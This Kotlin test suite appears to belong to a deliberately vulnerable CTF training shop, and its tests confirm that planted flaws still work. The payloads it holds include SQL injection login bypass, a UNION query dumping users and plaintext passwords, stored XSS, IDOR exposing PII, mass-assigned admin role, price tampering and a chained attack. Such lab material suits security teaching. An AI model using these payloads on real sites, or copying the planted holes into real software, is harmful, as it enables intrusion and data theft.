package com.treinamento.ctf

import com.treinamento.ctf.database.initDatabase
import io.ktor.client.*
import io.ktor.client.plugins.contentnegotiation.*
import io.ktor.client.request.*
import io.ktor.client.statement.*
import io.ktor.http.*
import io.ktor.serialization.jackson.*
import io.ktor.server.testing.*
import kotlinx.serialization.json.*
import org.junit.jupiter.api.*
import org.junit.jupiter.api.Assertions.*

@TestMethodOrder(MethodOrderer.OrderAnnotation::class)
class SecurityTest {

    companion object {
        @BeforeAll
        @JvmStatic
        fun setup() {
            System.setProperty("CTF_DB_PATH", ":memory:")
            initDatabase(":memory:")
        }
    }

    private fun withCtfApp(block: suspend ApplicationTestBuilder.(HttpClient) -> Unit) =
        testApplication {
            val client = createClient {
                install(ContentNegotiation) { jackson() }
            }
            block(client)
        }

    private suspend fun loginAdmin(client: HttpClient): String {
        val response = client.post("/api/auth/login") {
            contentType(ContentType.Application.Json)
            setBody("""{"email":"admin@secureshop.com","password":"Admin@2024!"}""")
        }
        val body = Json.parseToJsonElement(response.bodyAsText()).jsonObject
        return body["token"]?.jsonPrimitive?.content ?: fail("No token in login response")
    }

    @Test
    @Order(1)
    fun `V1-A SQL injection login bypass via password`() = withCtfApp { client ->
        val response = client.post("/api/auth/login") {
            contentType(ContentType.Application.Json)
            setBody("""{"email":"admin@secureshop.com","password":"' OR '1'='1' --"}""")
        }
        assertEquals(HttpStatusCode.OK, response.status, "V1: Login SQLi via password should return 200")
        assertTrue(response.bodyAsText().contains("token"), "V1: Response should contain a JWT token")
    }

    @Test
    @Order(2)
    fun `V1-B SQL injection login bypass via password comment`() = withCtfApp { client ->
        val response = client.post("/api/auth/login") {
            contentType(ContentType.Application.Json)
            setBody("""{"email":"admin@secureshop.com","password":"anything' OR '1'='1"}""")
        }
        assertEquals(HttpStatusCode.OK, response.status, "V1-B: Password injection should return 200")
        assertTrue(response.bodyAsText().contains("token"), "V1-B: Should return JWT token")
    }

    @Test
    @Order(3)
    fun `V1-C normal login works`() = withCtfApp { client ->
        val response = client.post("/api/auth/login") {
            contentType(ContentType.Application.Json)
            setBody("""{"email":"admin@secureshop.com","password":"Admin@2024!"}""")
        }
        assertEquals(HttpStatusCode.OK, response.status)
        assertTrue(response.bodyAsText().contains("token"))
    }

    @Test
    @Order(4)
    fun `V1-D email injection does NOT work because parameterized`() = withCtfApp { client ->
        val response = client.post("/api/auth/login") {
            contentType(ContentType.Application.Json)
            setBody("""{"email":"' OR '1'='1' --","password":"irrelevant"}""")
        }
        assertEquals(HttpStatusCode.Unauthorized, response.status,
            "Email injection should fail because email is parameterized")
    }

    @Test
    @Order(5)
    fun `V2 price manipulation trusts client total`() = withCtfApp { client ->
        val token = loginAdmin(client)
        val response = client.post("/api/orders") {
            contentType(ContentType.Application.Json)
            header(HttpHeaders.Authorization, "Bearer $token")
            setBody("""{"items":[{"product_id":1,"quantity":1,"price":0.01}],"total":0.01}""")
        }
        assertEquals(HttpStatusCode.Created, response.status, "V2: Should accept client-provided total")
        val body = Json.parseToJsonElement(response.bodyAsText()).jsonObject
        val order = body["order"]?.jsonObject
        assertNotNull(order, "V2: Should return order")
        assertEquals(0.01, order!!["total"]?.jsonPrimitive?.double, "V2: Total should be the client value 0.01")
    }

    @Test
    @Order(6)
    fun `V3 IDOR any user can access any other users profile`() = withCtfApp { client ->
        val loginRes = client.post("/api/auth/login") {
            contentType(ContentType.Application.Json)
            setBody("""{"email":"carlos@secureshop.com","password":"Senha123"}""")
        }
        assertEquals(HttpStatusCode.OK, loginRes.status)
        val token = Json.parseToJsonElement(loginRes.bodyAsText()).jsonObject["token"]?.jsonPrimitive?.content
            ?: fail("No token")

        val idorRes = client.get("/api/users/1") {
            header(HttpHeaders.Authorization, "Bearer $token")
        }
        assertEquals(HttpStatusCode.OK, idorRes.status, "V3: Carlos should be able to fetch admin profile")
        val profileJson = Json.parseToJsonElement(idorRes.bodyAsText()).jsonObject
        assertEquals("admin@secureshop.com", profileJson["email"]?.jsonPrimitive?.content)
        assertNotNull(profileJson["telefone"], "V3: PII (telefone) should be exposed")
        assertNotNull(profileJson["cpf_last4"], "V3: PII (cpf_last4) should be exposed")
    }

    @Test
    @Order(7)
    fun `V4 mass assignment register accepts role field`() = withCtfApp { client ->
        val response = client.post("/api/auth/register") {
            contentType(ContentType.Application.Json)
            setBody("""{"nome":"Hacker","email":"hacker@test.com","password":"hack123","role":"admin"}""")
        }
        assertEquals(HttpStatusCode.Created, response.status, "V4: Register should succeed")
        val body = Json.parseToJsonElement(response.bodyAsText()).jsonObject
        val user = body["user"]?.jsonObject
        assertEquals("admin", user?.get("role")?.jsonPrimitive?.content, "V4: Role should be 'admin' from request")
    }

    @Test
    @Order(8)
    fun `V5 stored XSS reviews stored without sanitization`() = withCtfApp { client ->
        val token = loginAdmin(client)
        val xssPayload = """<script>alert('xss')</script>"""
        val response = client.post("/api/products/1/reviews") {
            contentType(ContentType.Application.Json)
            header(HttpHeaders.Authorization, "Bearer $token")
            setBody("""{"text":"$xssPayload","rating":5}""")
        }
        assertEquals(HttpStatusCode.Created, response.status, "V5: Review should be created")
        val body = response.bodyAsText()
        assertTrue(body.contains("<script>"), "V5: XSS payload should be stored as-is")
    }

    @Test
    @Order(9)
    fun `V6 forgot-password stack trace disclosure`() = withCtfApp { client ->
        val response = client.post("/api/auth/forgot-password") {
            contentType(ContentType.Application.Json)
            setBody("""{"email":"test@test.com"}""")
        }
        assertEquals(HttpStatusCode.InternalServerError, response.status, "V6: Should fail with stack trace")
        val body = response.bodyAsText()
        assertTrue(body.contains("stack"), "V6: Should contain stack trace in error response")
    }

    @Test
    @Order(10)
    fun `V6 path traversal via export`() = withCtfApp { client ->
        val token = loginAdmin(client)
        val response = client.get("/api/export/csv.template") {
            header(HttpHeaders.Authorization, "Bearer $token")
        }
        assertEquals(HttpStatusCode.OK, response.status, "V6: Should read template file")
    }

    @Test
    @Order(11)
    fun `V7 CORS wildcard`() = withCtfApp { client ->
        val response = client.options("/api/products") {
            header(HttpHeaders.Origin, "http://evil.com")
            header(HttpHeaders.AccessControlRequestMethod, "GET")
        }
        val corsHeader = response.headers["Access-Control-Allow-Origin"]
        assertNotNull(corsHeader, "V7: CORS header should be present")
        assertEquals("*", corsHeader, "V7: CORS should allow all origins")
    }

    @Test
    @Order(12)
    fun `V8 SQL injection search UNION dumps users`() = withCtfApp { client ->
        val payload = "' UNION SELECT id,email,password,0,role,created_at FROM users--"
        val response = client.get("/api/products/search") {
            parameter("q", payload)
        }
        assertEquals(HttpStatusCode.OK, response.status, "V8: UNION injection should return 200")
        val body = response.bodyAsText()
        assertTrue(body.contains("secureshop.com"), "V8: Should leak user email addresses")
        assertTrue(
            body.contains("Admin@2024!") || body.contains("Senha123"),
            "V8: Should expose plaintext passwords"
        )
    }

    @Test
    @Order(13)
    fun `V8 SQL injection search verbose error`() = withCtfApp { client ->
        val response = client.get("/api/products/search") {
            parameter("q", "'")
        }
        assertEquals(HttpStatusCode.InternalServerError, response.status)
        val body = response.bodyAsText()
        assertTrue(body.contains("message") || body.contains("error"))
    }

    @Test
    @Order(14)
    fun `admin routes require JWT not X-Role header`() = withCtfApp { client ->
        val response = client.get("/api/admin/users") {
            header("X-Role", "admin")
        }
        assertEquals(HttpStatusCode.Unauthorized, response.status,
            "Admin routes should require JWT, not X-Role header")
    }

    @Test
    @Order(15)
    fun `logs routes require JWT admin`() = withCtfApp { client ->
        val response = client.get("/api/logs")
        assertEquals(HttpStatusCode.Unauthorized, response.status,
            "Logs should require JWT auth")
    }

    @Test
    @Order(16)
    fun `order detail leaks user info via JOIN`() = withCtfApp { client ->
        val token = loginAdmin(client)
        val response = client.get("/api/orders/1") {
            header(HttpHeaders.Authorization, "Bearer $token")
        }
        assertEquals(HttpStatusCode.OK, response.status)
        val body = response.bodyAsText()
        assertTrue(body.contains("user_name") || body.contains("user_email"),
            "Order detail should leak user info via JOIN")
    }

    @Test
    @Order(17)
    fun `CHAIN full SQLi password then IDOR then PII exposure`() = withCtfApp { client ->
        val loginRes = client.post("/api/auth/login") {
            contentType(ContentType.Application.Json)
            setBody("""{"email":"admin@secureshop.com","password":"' OR '1'='1' --"}""")
        }
        assertEquals(HttpStatusCode.OK, loginRes.status, "Chain: SQLi password bypass")
        val token = Json.parseToJsonElement(loginRes.bodyAsText())
            .jsonObject["token"]?.jsonPrimitive?.content ?: fail("No token from SQLi login")

        val idorRes = client.get("/api/users/2") {
            header(HttpHeaders.Authorization, "Bearer $token")
        }
        assertEquals(HttpStatusCode.OK, idorRes.status, "Chain: IDOR fetch")

        val userJson = Json.parseToJsonElement(idorRes.bodyAsText()).jsonObject
        val telefone = userJson["telefone"]?.jsonPrimitive?.content
        assertNotNull(telefone, "Chain: PII (telefone) should be exposed via IDOR")
    }
}
